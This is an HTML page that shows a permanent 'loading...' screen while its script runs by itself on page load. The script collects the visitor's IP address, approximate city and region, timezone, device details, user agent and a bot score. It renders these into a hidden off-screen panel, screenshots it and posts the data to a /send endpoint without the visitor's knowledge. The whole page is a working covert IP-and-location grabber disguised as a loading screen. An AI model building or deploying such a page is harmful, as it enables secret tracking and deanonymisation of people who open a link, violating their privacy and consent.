<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title>

<style>
html,body{height:100%;margin:0}
body{
  background:#000;color:#fff;
  font-family:Inter,system-ui,Arial,sans-serif;
  display:flex;align-items:center;justify-content:center;flex-direction:column
}
.big{font-size:36px}
.sub{font-size:12px;opacity:.6;margin-top:10px}

#capture-root{
  position:absolute;left:-9999px;top:-9999px;
  width:760px;padding:20px;background:#0b0b0b;border-radius:8px
}
.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px}
.card{background:#080808;padding:10px;border-radius:8px}
.card strong{display:block;font-size:15px}
.label{font-size:11px;color:#999}
#statusHidden{font-size:11px;color:#aaa;margin-top:10px}
</style>
</head>

<body>
  <!-- visible forever -->
  <div class="big">loading...</div>
  <div class="sub">this usually takes 1–20 seconds</div>

  <!-- hidden capture page -->
  <div id="capture-root">
    <h2>Device & Network Snapshot</h2>
    <div class="grid">
      <div class="card"><strong id="ip">...</strong><div class="label">IP</div></div>
      <div class="card"><strong id="country">...</strong><div class="label">Country</div></div>
      <div class="card"><strong id="location">...</strong><div class="label">Approx location</div></div>
      <div class="card"><strong id="timezone">...</strong><div class="label">Timezone</div></div>
      <div class="card"><strong id="bot">...</strong><div class="label">Bot Likelihood</div></div>
      <div class="card"><strong id="device">...</strong><div class="label">Device</div></div>
    </div>
    <div id="statusHidden">Preparing…</div>
  </div>

<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<script>
const el=id=>document.getElementById(id);
const safe=v=>(v??"N/A");

function botScore(){
  let s=0;
  if(/bot|headless|puppeteer|selenium/i.test(navigator.userAgent)) s+=2;
  if(navigator.webdriver) s+=2;
  if(!navigator.plugins?.length) s+=1;
  return s;
}

async function run(){
  try{
    el("statusHidden").textContent="Fetching IP…";
    const ip= (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
    el("ip").textContent=ip;

    el("statusHidden").textContent="Fetching geo…";
    const geo=await (await fetch(`/geo?ip=${ip}`)).json();
    el("country").textContent=safe(geo.country);
    el("location").textContent=`${safe(geo.city)}, ${safe(geo.region)}`;
    el("timezone").textContent=safe(geo.timezone);

    el("bot").textContent=botScore()>=3?"Likely":"No";
    el("device").textContent=
      `${navigator.platform} · ${navigator.hardwareConcurrency||"?"} cores · ${navigator.deviceMemory||"?"}GB`;

    el("statusHidden").textContent="Capturing…";
    await new Promise(r=>setTimeout(r,300));

    const canvas=await html2canvas(el("capture-root"),{scale:1.2});
    const blob=await (await fetch(canvas.toDataURL())).blob();

    const form=new FormData();
    form.append("file",blob,"snapshot.png");
    form.append("meta",JSON.stringify({
      ip,bot:el("bot").textContent,
      ua:navigator.userAgent,
      time:new Date().toISOString()
    }));

    el("statusHidden").textContent="Sending…";
    await fetch("/send",{method:"POST",body:form});

    el("statusHidden").textContent="Sent";
  }catch(e){
    console.error(e);
    el("statusHidden").textContent="Error";
  }
}
setTimeout(run,300);
</script>
</body>
</html>
